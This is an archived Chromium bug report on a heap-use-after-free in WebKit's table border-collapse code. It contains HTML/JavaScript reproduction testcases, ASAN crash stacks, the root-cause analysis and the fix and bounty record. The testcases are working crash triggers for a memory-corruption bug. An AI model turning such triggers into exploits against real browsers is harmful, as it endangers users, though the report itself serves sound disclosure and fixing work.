# Heap-use-after-free in WebCore::RenderTable::borderBefore

| Field | Value |
|-------|-------|
| **Issue ID** | [40052294](https://issues.chromium.org/issues/40052294) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | mi...@gmail.com |
| **Assignee** | jc...@chromium.org |
| **Created** | 2011-12-20 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

use-after-free with border collapsing 200 inside 248 (a different one)

**VERSION**  

Chrome Version:  

Chromium 18.0.977.0 (Developer Build 115130)  

OS Linux  

WebKit 535.14 (trunk@103328)  

JavaScript V8 3.7.12.6

Operating System: linux 64bit

**REPRODUCTION CASE**

<html>
<head>
<style>
#el1 {
display: table;
border-collapse: collapse;
-webkit-writing-mode: vertical-rl;
}
#el2 {
display: table-row-group;
}
</style>
<script>
window.onload=function(){
el0 = document.createElement('div')
document.body.appendChild(el0)
el1 = document.createElement('div')
el1.setAttribute('id', 'el1')
el0.appendChild(el1)
el2 = document.createElement('div')
el2.setAttribute('id', 'el2')
el1.appendChild(el2)
el0.style.display='inline-block'
setTimeout(function() {
el2.style.display='table'
},100)
}
</script>
</head>
<body>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: renderer + asan  

Crash State:

READ of size 4 at 0x7fffed2b9b48 thread T0  

#0 0x55555a999d15 in WebCore::RenderTable::borderBefore() const ???:0  

0x7fffed2b9b48 is located 200 bytes inside of 248-byte region [0x7fffed2b9a80,0x7fffed2b9b78)  

freed by thread T0 here:  

#0 0x55555ce518f4 in free ??:0  

#1 0x5555595949a7 in WebCore::Node::detach() ???:0  

#2 0x55555955b346 in WebCore::Element::recalcStyle(WebCore::Node::StyleChange) ???:0

## Attachments

- [200248.txt](attachments/200248.txt) (text/plain; charset=us-ascii, 3.5 KB)
- [200248.html](attachments/200248.html) (text/html; charset=us-ascii, 762 B)
- [204248other.txt](attachments/204248other.txt) (text/plain; charset=us-ascii, 3.3 KB)
- [204248two.html](attachments/204248two.html) (text/html; charset=us-ascii, 844 B)

## Timeline

### ke...@google.com (2011-12-21)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-12-21)

Julien, if this isn't up your alley then please bump yourself as owner. But if it is, would you mind upstreaming it as well? I've dorpped it into cluster-fuzz so a regression range and additional detail should be forthcoming.

### ke...@google.com (2011-12-21)

It looks like inferno put this into cluster-fuzz yesterday but somehow the report is missing (invalid key)?

### js...@chromium.org (2011-12-21)

There were some ASAN issues that needed fixing, so I assume he deleted the report.

### mi...@gmail.com (2011-12-21)

here is another repro/stack. this has the same stack as https://crbug.com/chromium/106340

### in...@chromium.org (2011-12-21)

Yeah, i am waiting for LKGR > http://src.chromium.org/viewvc/chrome?view=rev&revision=115347 so that we can get complete stacks from ClusterFuzz. I deleted the old report as important stack frames were missing.

### in...@chromium.org (2011-12-22)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=9270896

Uploader: inferno@chromium.org

Crash Type: Heap-use-after-free READ 4
Crash Address: 0x7f96965b21cc
Crash State:
  - crash stack -
  WebCore::RenderTable::outerBorderAfter
  WebCore::RenderBlock::computeBlockPreferredLogicalWidths
  - free stack -
  WebCore::Node::detach
  WebCore::Element::detach
  

Minimized Testcase (0.72 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv97kL9GHkjRtVCz7kj971QFTssiYu2Aq7tRUlimafS32BePeeSlvvgKuN5yoghZyXLhZ4sH1SWc24BM8AIbEFGh52MxLZcl2_4WOI9pQO7Y4Dv_XlZmoTYh5NBXN-hFVlLHnl8lg80fmBJgc-ppOf4mJ84f9RA
<style>
      #el0 {
        -webkit-writing-mode: vertical-rl; 
        border-collapse: collapse; 
      }
      #el1 {
        -webkit-writing-mode: horizontal-tb; 
</style>
    <script>
      function crash(){
        el0 = document.createElement('div') 
        el0.setAttribute('id', 'el0') 
        document.body.appendChild(el0) 
        el1 = document.createElement('div') 
        el1.setAttribute('id', 'el1') 
        el0.appendChild(el1) 
        el2 = document.createElement('div') 
        el1.appendChild(el2) 
        el1.style.display='table'
        el2.style.display='table-footer-group'
        setTimeout(function() {
          el2.style.display='inline'
        },0)
      }
      window.onload=crash
    </script>

### in...@chromium.org (2011-12-22)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=9271466

Uploader: inferno@chromium.org

Crash Type: Heap-use-after-free READ 4
Crash Address: 0x7f454f461bc8
Crash State:
  - crash stack -
  WebCore::RenderTable::borderBefore
  WebCore::RenderBlock::computeBlockPreferredLogicalWidths
  - free stack -
  WebCore::Node::detach
  WebCore::Element::detach
  

Minimized Testcase (0.68 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv961KzN01dqZBLhX8DrT4VwfLvAslx-QakhfwOJEP_rKDpUk2U6Mt_rqWIDutaXw4J71FPz7eAkJj3IwGAjDOaSPZmchYH2ROh5Px8k1f-3IPCON0-7yi2ruuy20aVCKOmPee3Cjp3FiChQnJvvKSELB1CVeUA
<style>
      #el1 {
        display: table;
        border-collapse: collapse;
        -webkit-writing-mode: vertical-rl;
      }
      #el2 {
        display: table-row-group;
</style>
    <script>
      window.onload=function(){
        el0 = document.createElement('div') 
        document.body.appendChild(el0) 
        el1 = document.createElement('div') 
        el1.setAttribute('id', 'el1') 
        el0.appendChild(el1) 
        el2 = document.createElement('div') 
        el2.setAttribute('id', 'el2') 
        el1.appendChild(el2) 
        el0.style.display='inline-block' 
        setTimeout(function() {
          el2.style.display='table' 
        },100)
      }
    </script>

### in...@chromium.org (2011-12-22)

So, regression range has to between r106036-r106670 (affects 106670, but not stable). Seeing it looks like Julien change in https://trac.webkit.org/changeset/97691/ [range is https://cluster-fuzz.appspot.com/revisions?range=106037:106670]

### in...@chromium.org (2011-12-22)

[Empty comment from Monorail migration]

### in...@chromium.org (2011-12-26)

Upstreamed - https://bugs.webkit.org/show_bug.cgi?id=75215

### jc...@chromium.org (2012-01-06)

I investigated the test case and this is a regression from https://trac.webkit.org/changeset/97661. Inferno, https://trac.webkit.org/changeset/97691/ is a mechanical change related to rowSpan / colSpan so a pretty unlikely suspect from that perspective ;)

The changeset is poking the table borders before having calling layout. Here is the bad line from RenderBlock.cpp:5340:

childBox->setLogicalHeight(childBox->borderAndPaddingLogicalHeight());

This is super dangerous to do on a table as we may need to recompute our sections (which means stale pointers galore :().

This is a table issue so I am going to fix it.

### jc...@chromium.org (2012-01-06)

ojan FYI!

### in...@chromium.org (2012-01-20)

http://trac.webkit.org/changeset/105542

### in...@chromium.org (2012-01-23)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-01-24)

merged to m17 in r105782

### sc...@gmail.com (2012-01-25)

@miaubiz: another nice catch, thanks. Another bug prevented for being released to Chrome 17 :)

$1000

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sc...@gmail.com (2012-02-15)

[Empty comment from Monorail migration]

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed..

### ke...@chromium.org (2012-07-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### cl...@chromium.org (2013-06-13)

ClusterFuzz has detected this issue as fixed in range 118516:118712.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=9270896

Uploader: inferno@chromium.org

Crash Type: Heap-use-after-free READ 4
Crash Address: 0x7f96965b21cc
Crash State:
  - crash stack -
  WebCore::RenderTable::outerBorderAfter
  WebCore::RenderBlock::computeBlockPreferredLogicalWidths
  - free stack -
  WebCore::Node::detach
  WebCore::Element::detach
  
Fixed: https://cluster-fuzz.appspot.com/revisions?range=118516:118712

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv97kL9GHkjRtVCz7kj971QFTssiYu2Aq7tRUlimafS32BePeeSlvvgKuN5yoghZyXLhZ4sH1SWc24BM8AIbEFGh52MxLZcl2_4WOI9pQO7Y4Dv_XlZmoTYh5NBXN-hFVlLHnl8lg80fmBJgc-ppOf4mJ84f9RA

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### cl...@chromium.org (2013-06-13)

ClusterFuzz has detected this issue as fixed in range 118516:118712.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=9271466

Uploader: inferno@chromium.org

Crash Type: Heap-use-after-free READ 4
Crash Address: 0x7f454f461bc8
Crash State:
  - crash stack -
  WebCore::RenderTable::borderBefore
  WebCore::RenderBlock::computeBlockPreferredLogicalWidths
  - free stack -
  WebCore::Node::detach
  WebCore::Element::detach
  
Fixed: https://cluster-fuzz.appspot.com/revisions?range=118516:118712

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv961KzN01dqZBLhX8DrT4VwfLvAslx-QakhfwOJEP_rKDpUk2U6Mt_rqWIDutaXw4J71FPz7eAkJj3IwGAjDOaSPZmchYH2ROh5Px8k1f-3IPCON0-7yi2ruuy20aVCKOmPee3Cjp3FiChQnJvvKSELB1CVeUA

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/108207?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40052294)*
